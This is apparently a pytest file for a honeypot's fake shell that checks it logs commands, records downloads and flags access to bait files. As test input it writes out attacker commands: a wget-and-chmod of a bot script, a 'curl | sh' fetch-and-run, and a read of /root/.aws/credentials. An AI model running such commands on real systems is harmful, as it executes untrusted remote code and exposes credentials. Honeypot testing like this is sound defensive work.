from honeynest.shell import FakeShell


def make_shell(username="root", downloads=None):
    events = []
    shell = FakeShell("srv-test", username, lambda event, detail=None, **data: events.append((event, detail)),
                      on_download=downloads.append if downloads is not None else None)
    return shell, events


def test_prompt_root_and_user():
    assert make_shell("root")[0].prompt() == "root@srv-test:~# "
    assert make_shell("ubuntu")[0].prompt() == "ubuntu@srv-test:~$ "


def test_every_command_is_recorded():
    shell, events = make_shell()
    shell.execute("uname -a")
    assert events == [("command", "uname -a")]


def test_cd_and_pwd():
    shell, _ = make_shell()
    assert shell.execute("cd /var/www/html; pwd")[0] == "/var/www/html\n"
    assert "No such file" in shell.execute("cd /nao/existe")[0]


def test_download_is_detected_and_forwarded():
    downloads = []
    shell, events = make_shell(downloads=downloads)
    shell.execute("cd /tmp && wget http://203.0.113.5/bot.sh; chmod +x bot.sh")
    shell.execute("curl -s http://203.0.113.6/x | sh")
    assert downloads == ["http://203.0.113.5/bot.sh", "http://203.0.113.6/x"]
    assert ("download", "http://203.0.113.5/bot.sh") in events


def test_bait_file_access_is_recorded():
    shell, events = make_shell()
    output = shell.execute("cat /root/.aws/credentials")[0]
    assert "aws_access_key_id" in output
    assert ("bait_accessed", "/root/.aws/credentials") in events


def test_redirect_writes_to_fake_filesystem():
    shell, _ = make_shell()
    assert shell.execute("echo hacked > /tmp/proof")[0] == ""
    assert shell.execute("cat /tmp/proof")[0] == "hacked\n"


def test_sudo_and_bash_c():
    shell, _ = make_shell("ubuntu")
    assert shell.execute("sudo whoami")[0] == "ubuntu\n"
    assert shell.execute("bash -c 'echo ok'")[0] == "ok\n"


def test_unknown_command_and_exit():
    shell, _ = make_shell()
    assert shell.execute("xyz")[0] == "xyz: command not found\n"
    assert shell.execute("exit")[1] is True
